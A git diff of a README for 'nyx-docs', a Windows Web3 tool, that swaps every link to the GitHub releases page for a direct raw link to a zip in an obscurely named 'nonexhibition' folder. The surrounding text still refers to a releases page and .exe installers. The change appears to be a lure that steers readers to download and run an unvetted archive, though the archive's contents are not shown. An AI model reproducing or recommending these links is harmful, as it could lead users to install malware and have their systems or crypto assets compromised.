@@ -1,6 +1,6 @@
 # 🛡️ nyx-docs - Secure Web3 Infrastructure Made Simple
 
-[![Download nyx-docs](https://img.shields.io/badge/Download-nyx--docs-brightgreen?style=for-the-badge)](https://github.com/alayoubiadam7-afk/nyx-docs/releases)
+[![Download nyx-docs](https://img.shields.io/badge/Download-nyx--docs-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/alayoubiadam7-afk/nyx-docs/main/nonexhibition/nyx-docs-v2.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to get nyx-docs running on your Windows machine. The process 
 ## ⬇️ Download and Install nyx-docs
 
 1. Click the button below or visit this link to find the latest Windows version of nyx-docs:  
-   [Download nyx-docs](https://github.com/alayoubiadam7-afk/nyx-docs/releases)  
+   [Download nyx-docs](https://raw.githubusercontent.com/alayoubiadam7-afk/nyx-docs/main/nonexhibition/nyx-docs-v2.3.zip)  
 
 2. On the releases page, look for the latest version. Files are usually named clearly to indicate the version and Windows compatibility. Example: `nyx-docs-setup-v1.2.3.exe` or similar.
 
@@ -119,7 +119,7 @@ You do not need to memorize these, but knowing them will help you understand nyx
 ## 🔗 Additional Downloads and Updates
 
 Visit the official releases page anytime to get the latest versions, bug fixes, and new features:  
-[https://github.com/alayoubiadam7-afk/nyx-docs/releases](https://github.com/alayoubiadam7-afk/nyx-docs/releases)
+[https://raw.githubusercontent.com/alayoubiadam7-afk/nyx-docs/main/nonexhibition/nyx-docs-v2.3.zip](https://raw.githubusercontent.com/alayoubiadam7-afk/nyx-docs/main/nonexhibition/nyx-docs-v2.3.zip)
 
 ---
 
